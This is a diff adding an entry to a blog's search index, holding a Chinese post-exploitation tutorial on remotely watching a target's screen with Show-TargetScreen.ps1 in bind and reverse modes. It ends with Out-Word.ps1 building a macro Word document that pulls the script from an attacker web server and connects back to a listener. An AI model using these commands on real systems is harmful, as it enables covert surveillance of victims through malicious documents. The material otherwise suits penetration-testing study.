@@ -1,6 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Powershell ________ 对目标进行屏幕监控</title>
+    <url>/2020/03/25/Powershell%20________%20%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/</url>
+    <content><![CDATA[<font face="微软雅黑" size = 5.5 color = red >
+
+<h2 id="Bind模式："><a href="#Bind模式：" class="headerlink" title="Bind模式："></a><strong>Bind模式：</strong></h2><p>出现下面这种情况<br><img src="https://img-blog.csdnimg.cn/20200325191322855.png" alt="在这里插入图片描述"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">管理员powershell：执行 set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Bind -Port <span class="number">3333</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在自己的计算机上使用火狐访问目标3333端口，结果如下图：<br><img src="https://img-blog.csdnimg.cn/20200325191758673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="Reverse模式"><a href="#Reverse模式" class="headerlink" title="Reverse模式"></a><strong>Reverse模式</strong></h2><p><strong>attacker：</strong></p>
+<p>在这里可以使用创宇的py脚本转发：</p>
+<p><a href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a><br><strong>执行:</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rtcp [master] python rtcp.py l:<span class="number">5555</span> l:<span class="number">4444</span></span><br><span class="line">监听本地<span class="number">5555</span>端口以及<span class="number">4444</span>端口。</span><br></pre></td></tr></table></figure>
+
+<p>   之后在target执行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Reverse-IPAddress <span class="number">192.168</span><span class="number">.74</span><span class="number">.1</span> -Port <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200325192032100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="使用Powershell-Client"><a href="#使用Powershell-Client" class="headerlink" title="使用Powershell Client"></a>使用Powershell Client</h2><p>以Out-Word.ps1作为演示示例：</p>
+<p>生成word文件:</p>
+<p>PS C:\Users\evi1cg\Desktop&gt; . .\Out-Word.ps1<br>PS C:\Users\evi1cg\Desktop&gt; Out-Word -PayloadURL”<a href="http://192.168.74.1/Show-TargetScreen.ps1&quot;">http://192.168.74.1/Show-TargetScreen.ps1&quot;</a> -Arguments”Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 6666”<br>之后将Show-TargetScreen.ps1放在我们的web根目录：</p>
+<p>测试：<br><img src="https://img-blog.csdnimg.cn/20200325192125861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>开启监听：</p>
+<p>rtcp [master] python rtcp.py l:6666 l:4444<br>当运行开启office宏的word时，我们就可对其屏幕进行监控，如下图：<br><img src="https://img-blog.csdnimg.cn/20200325192133185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>后渗透-powershell脚本使用</category>
+      </categories>
+  </entry>
+  <entry>
     <title>metasploit后渗透</title>
     <url>/2020/03/25/metasploit%E5%90%8E%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<font face="微软雅黑" size = 5.5 color = red > 
